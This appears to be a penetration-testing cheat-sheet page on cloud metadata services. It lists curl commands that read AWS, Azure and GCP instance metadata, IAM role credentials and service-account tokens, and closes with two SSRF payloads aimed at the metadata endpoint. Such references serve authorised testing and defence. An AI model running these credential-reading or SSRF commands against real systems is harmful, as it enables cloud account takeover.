# Cloud Metadata Services

<span class="ol-search-aliases">imds imdsv1 imdsv2 169.254.169.254 metadata ssrf azure gcp aws credentials</span>

<div class="ol-section-kicker"><span>CLOUD</span><strong>Metadata</strong></div>

## AWS IMDSv2 token
```bash
TOKEN=$(curl -fsS -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
```
**Tool:** curl · **Platform:** Linux · **Tags:** AWS, IMDSv2, Metadata · **Context:** Cloud workload · **Requires:** Route to IMDS · **Noise:** Quiet

## AWS instance identity
```bash
curl -fsS -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document
```
**Tool:** curl · **Platform:** Linux · **Tags:** AWS, IMDSv2, Identity · **Context:** Cloud workload · **Requires:** IMDSv2 token · **Noise:** Quiet

## AWS IAM role name
```bash
curl -fsS -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Tool:** curl · **Platform:** Linux · **Tags:** AWS, IMDSv2, IAM Role · **Context:** Cloud workload · **Requires:** IMDS access · **Noise:** Quiet

## Azure instance metadata
```bash
curl -fsS -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | jq .
```
**Tool:** curl · **Platform:** Linux · **Tags:** Azure, IMDS, Instance · **Context:** Cloud workload · **Requires:** Route to IMDS · **Noise:** Quiet

## Azure managed-identity token
```bash
curl -fsS -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' | jq .
```
**Tool:** curl · **Platform:** Linux · **Tags:** Azure, Managed Identity, Token · **Context:** Cloud workload · **Requires:** Assigned managed identity · **Noise:** Quiet

## GCP project metadata
```bash
curl -fsS -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id
```
**Tool:** curl · **Platform:** Linux · **Tags:** GCP, Metadata, Project · **Context:** Cloud workload · **Requires:** Metadata service access · **Noise:** Quiet

## GCP service-account token
```bash
curl -fsS -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq .
```
**Tool:** curl · **Platform:** Linux · **Tags:** GCP, Metadata, Service Account · **Context:** Cloud workload · **Requires:** Attached service account · **Noise:** Quiet

## Generic SSRF metadata reachability check
```bash
curl -fsS '<SSRF_ENDPOINT>?url=http://169.254.169.254/'
```
**Tool:** curl · **Platform:** Cross-platform · **Tags:** SSRF, Metadata, Validation · **Context:** No auth or app user · **Requires:** In-scope SSRF endpoint · **Noise:** Moderate


## SSRF to AWS IMDSv1 path when enabled
```bash
curl -fsS '<SSRF_ENDPOINT>?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
```
**Tool:** curl · **Platform:** Cross-platform · **Tags:** AWS, IMDSv1, SSRF · **Context:** No auth or app user · **Requires:** In-scope SSRF sink and IMDSv1 enabled · **Noise:** Moderate

**Related:** [SSRF & SSTI](../web/ssrf-ssti.md) · [AWS IAM](aws-iam.md) · [Azure Identity](azure-identity.md) · [GCP IAM](gcp-iam.md)
